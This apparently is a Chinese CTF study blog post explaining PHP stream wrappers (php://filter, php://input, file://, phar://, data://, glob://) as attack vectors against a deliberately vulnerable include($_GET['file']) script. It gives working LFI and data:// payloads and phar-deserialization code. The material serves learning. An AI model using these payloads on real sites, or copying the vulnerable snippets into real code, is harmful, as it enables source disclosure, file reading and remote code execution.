    <content type="html"><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p><p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p><p>希望自己以后不要再被这个考点麻住了的说</p><p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫</del></a></p><span id="more"></span><h1 id="食材准备"><a href="#食材准备" class="headerlink" title="食材准备"></a>食材准备</h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p><p>支持的种类分为十二种：</p><p>file:// — 访问本地文件系统</p><p>http:// – https:// — 访问 HTTP(s) 网址</p><p>ftp:// – ftps:// — 访问 FTP(s) URLs</p><p>php:// — 访问各个输入/输出流（I/O streams）</p><p>zlib:// – bzip2:// – zip:// — 压缩流</p><p>data:// — 数据（RFC 2397）</p><p>glob:// — 查找匹配的文件路径模式</p><p>phar:// — PHP 归档</p><p>ssh2:// — Secure Shell 2</p><p>rar:// — RAR</p><p>ogg:// — 音频流</p><p>expect:// — 处理交互式的流</p><p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p><p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p><h1 id="厨房交响"><a href="#厨房交响" class="headerlink" title="厨房交响"></a>厨房交响</h1><h2 id="php-filter-—-你吧来拿"><a href="#php-filter-—-你吧来拿" class="headerlink" title="php://filter — 你吧来拿"></a>php://filter — 你吧来拿</h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p><blockquote><p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p><p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p></blockquote><p>常用参数概览</p><blockquote><p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p><p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p><p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p></blockquote><p>常用过滤器</p><blockquote><p>convert.base64-encode &amp; convert.base64-decode</p><p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p></blockquote><h3 id="本地试吃"><a href="#本地试吃" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>此时index.php的同级目录下有个叫做test.txt的文件。</p><p>试图读取里面的信息</p><p><img src="/images/BUU/202112211700194.png"></p><p>不对啊，我明明往里面写了东西的呢</p><p>让我们用过滤器看看是怎么回事</p><p><img src="/images/BUU/202112211703524.png"></p><p>然后编回来</p><p><img src="/images/BUU/202112211711151.png"></p><p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p><h2 id="php-input-—-这是替身攻击"><a href="#php-input-—-这是替身攻击" class="headerlink" title="php://input — 这是替身攻击"></a>php://input — 这是替身攻击</h2><blockquote><p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p></blockquote><p>那既然都提到POST了，能不带GET玩嘛~</p><h3 id="本地试吃-1"><a href="#本地试吃-1" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure><p>试图搞事</p><p><img src="/images/BUU/202112211942039.png"></p><p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p><p><strong>替 身 觉 醒</strong></p><p><img src="/images/BUU/202112211952241.png"></p><p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p><p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p><p>某些情况下 绕过GET型传参的waf很好用。</p><p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p><h2 id="file-—-让我访问你网站正不正常啊"><a href="#file-—-让我访问你网站正不正常啊" class="headerlink" title="file:// — 让我访问你网站正不正常啊"></a>file:// — 让我访问你网站正不正常啊</h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p><p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p><p><img src="/images/BUU/202112211522406.png"></p><p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p><h3 id="本地试吃-2"><a href="#本地试吃-2" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure><p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p><p><img src="/images/BUU/202112212116212.png"></p><h2 id="phar-—-有基佬开我裤链"><a href="#phar-—-有基佬开我裤链" class="headerlink" title="phar:// — 有基佬开我裤链"></a>phar:// — 有基佬开我裤链</h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p><p>在周大福里经常作为反序列化考点出现。</p><p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p><h3 id="本地试吃-3"><a href="#本地试吃-3" class="headerlink" title="本地试吃"></a>本地试吃</h3><p>我们先试着创建一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p><p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p><p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p><p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p><p><img src="/images/BUU/202112211610188.png"></p><p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/202112211623190.png"></p><p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p><p><strong>一种经典周大福</strong></p><p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p><h2 id="data-—-皇军托我给您带个话"><a href="#data-—-皇军托我给您带个话" class="headerlink" title="data:// — 皇军托我给您带个话"></a>data:// — 皇军托我给您带个话</h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p><p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p><h3 id="本地试吃-4"><a href="#本地试吃-4" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/202112212011428.png"></p><h2 id="glob-—-我来了就是查寝来了"><a href="#glob-—-我来了就是查寝来了" class="headerlink" title="glob:// — 我来了就是查寝来了"></a>glob:// — 我来了就是查寝来了</h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码实现了一个简单的文件查看器的功能。</p><p><img src="/images/BUU/202112262150620.png"></p><p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p><p><img src="/images/BUU/202112262157376.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。&lt;/p&gt;
&lt;p&gt;写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。&lt;/p&gt;
&lt;p&gt;希望自己以后不要再被这个考点麻住了的说&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1XM4y1c7Jp&quot;&gt;&lt;del&gt;大学期末赛高考 下一篇又得拖到什么时候哦（瘫&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
  </entry>
  
</feed>
